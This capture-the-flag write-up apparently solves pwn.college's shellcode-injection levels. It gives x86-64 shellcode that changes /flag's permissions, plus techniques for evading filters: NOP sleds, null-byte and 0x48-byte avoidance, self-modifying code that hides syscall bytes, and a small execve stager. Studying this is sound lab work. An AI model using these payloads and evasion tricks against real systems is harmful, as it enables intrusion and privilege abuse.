# Shellcode Injection

{% hint style="info" %}
You can find the full code for all challenges [here](https://github.com/kunalwalavalkar/Pwn-College/tree/main/Shellcode%20Injection).
{% endhint %}



## level 1

> Write and execute shellcode to read the flag!

We can use `chmod` to change fthe file permissions on the /flag file.

```armasm
# Chmod syscall
lea rdi, [rip + flag]
mov rsi, 4
mov rax, 0x5a
syscall
```

We can compile the program using `gcc`.

```
$ gcc -nostdlib ./shellcode.s -o ./shellcode
```

The `-nostdlib` flag, which tells the compiler not to include the standard C library.

Let's extract the .text section using `objcopy`.

```
$ objcopy --dump-section .text=./shellcode.bin ./shellcode
```

The `--dump-section` is used to extract a specific section from the object file.

We can provide the `./shellcode.bin` file as stdin to the challenge as follows:

```
$ /challenge/babyshell_level1 < ./shellcode.bin
```

We can now read the flag.

```
$ cat /flag
```



## level 2

> Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.

Let's implement a [NOP sled](https://en.wikipedia.org/wiki/NOP\_slide) skips the first `0x800` bytes then.

```armasm
.rept 0x800
nop
.endr
```

The rest of the steps and code remains the same.



## level 3

> This challenge requires that your shellcode have no NULL bytes!

We can use `objdump` to see the hexadecimal representation of our code.

```
~$ objdump -d shellcode

; -- snip --
0000000000001000 <_start>:
    1000:       48 8d 3d 20 00 00 00    lea    0x20(%rip),%rdi        # 1027 <flag>
    1007:       48 c7 c6 04 00 00 00    mov    $0x4,%rsi
    100e:       48 c7 c0 5a 00 00 00    mov    $0x5a,%rax
    1015:       0f 05                   syscall 
    1017:       48 c7 c7 00 00 00 00    mov    $0x0,%rdi
    101e:       48 c7 c0 3c 00 00 00    mov    $0x3c,%rax
    1025:       0f 05                   syscall 

0000000000001027 <flag>:
    1027:       2f                      (bad)  
    1028:       66 6c                   data16 insb (%dx),%es:(%rdi)
    102a:       61                      (bad)  
    102b:       67                      addr32
```

* As we can see, our code has a bunch of `NULL` bytes.
* There's multiple ways to ensure that our code doesn't have null bytes, easiest being the use of smaller registers.
* One challenge we will face is providing the FILENAME as an argument for our `chmod` syscall.
* We can work around this by pushing the "galf" onto the stack (Keep in mind memory is stored in little endian format so "flag" is stored as "galf").

```armasm
# Chmod syscall
push 0x67616c66 <---- galf
push rsp
pop rdi
mov sil, 4
mov al, 0x5a
syscall
```



## level 4

> This challenge requires that your shellcode have no H bytes!

* `H bytes` are represented as `0x48`.
* They are used to denote instructions that operate in `64-bit` context.
* Fortunately our code form [level\_3](shellcode-injection.md#level-3) works just fine.



## level 5

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

* Since `syscall` instructions are now, we will have to create a [self-modifying shellcode](https://nets.ec/Shellcode/Self-modifying) which will bypass the filters.
* For this, we have to create a label that has the bytes, `0x0e` and `0x04`.

```armasm
sys1:
.byte 0x0e
.byte 0x04
```

* Before this label is executed, we have to increment the byte values so that they are `0x0f` and `0x05` which is the bytecode for `syscall`.
* Our modifications should look something like this:

```armasm
inc byte ptr [rip + sys1 + 1]
inc byte ptr [rip + sys1]

sys1:
.byte 0x0e
.byte 0x04
```



## level 6

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!

* The code from [level 5](shellcode-injection.md#level-5) will work for this level but before that we have to make some changes.
* Since the first 4096 bytes will not have write permission, we have to make sure that they are useless for our shellcode to execute. THis can be achieved using NOP sled similar to level 2.

```
.rept 0x1000
nop
.endr
```

* This time the `nop` instruction will repeat 4096 times.



## level 7

> Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.

* Since we are not outputting the flag to `stdout`, this is not really a problem for us.
* We can go ahead and use the code from [level 1](shellcode-injection.md#level-1).



## level 8

> Write and execute shellcode to read the flag, but you only get 18 bytes.

* We could just use the code from [level 4](shellcode-injection.md#level-4), as it is 14 bytes long.

```
~$ objdump -d shellcode -M intel

0000000000001000 <_start>:
    1000:       68 66 6c 61 67          push   0x67616c66
    1005:       54                      push   rsp
    1006:       5f                      pop    rdi
    1007:       40 b6 04                mov    sil,0x4
    100a:       b0 5a                   mov    al,0x5a
    100c:       0f 05                   syscall 
```

* As we are not writing anything in this code, we can just ignore the fact that first 4096 bytes are non-writeable.
* However I think this is a great opportunity to get familiar with [multi-stage shellcode](https://compilepeace.medium.com/shellcoding-0x3-dropping-multi-stage-payload-fdd635fcbf70). A multi-stage shellcode uses multiple scripts that execute the next script.
* We can use two shellcode scripts for this level. The size restriction will only be enforced on the first script.
* We will begin writing the second stage first.

```c
// catflag.c

void main()
{
    chmod("/flag", 4);
}
```

* Now let's compile this file using the following command:

```
gcc catflag.c -o \;
```

* Notice the output is a file named `;` whose value is `0x3b`.
* The first shellcode which is also know an dropper payload or stager, will use `execve` and execute the second stage.

```armasm
# Execve syscall
mov al, 0x3b
push rax
mov rdi, rsp 
xor rsi, rsi
xor rdx, rdx
syscall
```

* Since the hexcode for the `execve` syscall is `0x3b` as well, we can push `$rax` and then pop it back in to `$rdi` as the file-path argument.
* This saves precious bytes. Credit goes to [ctfwriteup.com](https://www.ctfwriteup.com/pwn/pwn.college/shellcoding/babyshell#level-1).



## level 10

> Write and execute shellcode to read the flag, but your input is sorted before being executed!

* This level mangles / sorts our shellcode after every 16 bytes.
* Since the code from level 4 fits in 14 bytes, it won't get mangled and we can get the flag.

```
~$ objdump -d shellcode -M intel

0000000000001000 <_start>:
    1000:       68 66 6c 61 67          push   0x67616c66
    1005:       54                      push   rsp
    1006:       5f                      pop    rdi
    1007:       40 b6 04                mov    sil,0x4
    100a:       b0 5a                   mov    al,0x5a
    100c:       0f 05                   syscall 
```



## level 11

> Write and execute shellcode to read the flag, but your input is sorted before being executed and stdin is closed.

* Again level mangles / sorts our shellcode after every 16 bytes and since the are using `chmod`, we don't care about stdin being closed.
* The code from level 4 will work here as well.

